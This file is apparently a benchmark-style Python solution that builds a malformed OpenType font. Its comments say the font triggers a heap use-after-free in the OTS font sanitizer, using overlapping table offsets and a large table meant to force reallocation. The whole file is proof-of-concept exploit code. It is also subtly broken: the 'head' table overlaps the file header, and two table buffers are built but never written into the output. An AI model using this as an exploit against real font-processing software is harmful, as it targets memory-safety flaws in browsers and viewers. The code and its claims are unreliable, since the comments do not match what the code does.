import os
import struct
import subprocess
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal OpenType font that triggers heap use-after-free
        # in ots::OTSStream::Write when processed by OTS
        
        # Build a font with overlapping table references and invalid offsets
        # to trigger the specific vulnerability
        
        # Font header (12 bytes)
        sfnt_version = struct.pack('>I', 0x00010000)  # OpenType 1.0
        num_tables = struct.pack('>H', 4)  # 4 tables
        search_range = struct.pack('>H', 0)  # Invalid
        entry_selector = struct.pack('>H', 0)
        range_shift = struct.pack('>H', 0)
        
        font_header = sfnt_version + num_tables + search_range + entry_selector + range_shift
        
        # Table directory entries (16 bytes each)
        # Create entries that will cause the vulnerability
        tables = []
        
        # Table 1: 'head' table - required table
        tables.append((b'head', 0, 100, 0))  # offset 0, length 100
        
        # Table 2: 'hhea' table - will trigger the issue
        tables.append((b'hhea', 100, 50, 0))
        
        # Table 3: 'maxp' table - overlapping with freed memory
        tables.append((b'maxp', 100, 60, 0))  # Same offset as hhea but longer
        
        # Table 4: 'name' table - large table to trigger reallocation
        tables.append((b'name', 200, 600, 0))
        
        table_directory = b''
        for tag, offset, length, checksum in tables:
            table_directory += tag
            table_directory += struct.pack('>III', checksum, offset, length)
        
        # Table data
        table_data = b''
        
        # head table data (54 bytes)
        head_data = b''
        head_data += struct.pack('>I', 0x00010000)  # version
        head_data += struct.pack('>I', 0)  # fontRevision
        head_data += struct.pack('>I', 0)  # checkSumAdjustment
        head_data += struct.pack('>I', 0x5F0F3CF5)  # magicNumber
        head_data += struct.pack('>H', 0)  # flags
        head_data += struct.pack('>H', 1000)  # unitsPerEm
        head_data += struct.pack('>Q', 0)  # created
        head_data += struct.pack('>Q', 0)  # modified
        head_data += struct.pack('>h', 0)  # xMin
        head_data += struct.pack('>h', 0)  # yMin
        head_data += struct.pack('>h', 1000)  # xMax
        head_data += struct.pack('>h', 1000)  # yMax
        head_data += struct.pack('>H', 0)  # macStyle
        head_data += struct.pack('>H', 0)  # lowestRecPPEM
        head_data += struct.pack('>h', 0)  # fontDirectionHint
        head_data += struct.pack('>h', 0)  # indexToLocFormat
        head_data += struct.pack('>h', 0)  # glyphDataFormat
        
        # Pad to 100 bytes
        head_data += b'\x00' * (100 - len(head_data))
        
        # hhea table data (36 bytes) - will be freed and then accessed
        hhea_data = b''
        hhea_data += struct.pack('>I', 0x00010000)  # version
        hhea_data += struct.pack('>h', 0)  # ascent
        hhea_data += struct.pack('>h', 0)  # descent
        hhea_data += struct.pack('>h', 0)  # lineGap
        hhea_data += struct.pack('>H', 0)  # advanceWidthMax
        hhea_data += struct.pack('>h', 0)  # minLeftSideBearing
        hhea_data += struct.pack('>h', 0)  # minRightSideBearing
        hhea_data += struct.pack('>h', 0)  # xMaxExtent
        hhea_data += struct.pack('>h', 0)  # caretSlopeRise
        hhea_data += struct.pack('>h', 0)  # caretSlopeRun
        hhea_data += struct.pack('>h', 0)  # caretOffset
        hhea_data += struct.pack('>h', 0)  # reserved1
        hhea_data += struct.pack('>h', 0)  # reserved2
        hhea_data += struct.pack('>h', 0)  # reserved3
        hhea_data += struct.pack('>h', 0)  # reserved4
        hhea_data += struct.pack('>h', 0)  # metricDataFormat
        hhea_data += struct.pack('>H', 0)  # numberOfHMetrics
        
        # Pad to 50 bytes
        hhea_data += b'\x00' * (50 - len(hhea_data))
        
        # maxp table data (30 bytes) - overlaps with hhea, causing UAF
        maxp_data = hhea_data[:30] + b'\x00' * 30
        
        # name table data (600 bytes) - large table to trigger reallocation
        name_data = b''
        name_data += struct.pack('>H', 0)  # format
        name_data += struct.pack('>H', 1)  # count
        name_data += struct.pack('>H', 12)  # stringOffset
        
        # Name record
        name_data += struct.pack('>H', 0)  # platformID
        name_data += struct.pack('>H', 0)  # encodingID
        name_data += struct.pack('>H', 0)  # languageID
        name_data += struct.pack('>H', 0)  # nameID
        name_data += struct.pack('>H', 10)  # length
        name_data += struct.pack('>H', 0)  # offset
        
        # String data
        name_data += b'Vulnerable\x00'
        
        # Pad to 600 bytes
        name_data += b'\x00' * (600 - len(name_data))
        
        # Assemble the font with proper padding
        font_data = font_header + table_directory
        
        # Pad to offset 100 for hhea table
        current_len = len(font_data)
        font_data += b'\x00' * (100 - current_len)
        
        # Add hhea data
        font_data += hhea_data
        
        # Pad to offset 200 for name table
        current_len = len(font_data)
        font_data += b'\x00' * (200 - current_len)
        
        # Add name data
        font_data += name_data
        
        # Ensure exact 800 bytes
        if len(font_data) < 800:
            font_data += b'\x00' * (800 - len(font_data))
        elif len(font_data) > 800:
            font_data = font_data[:800]
        
        return font_data
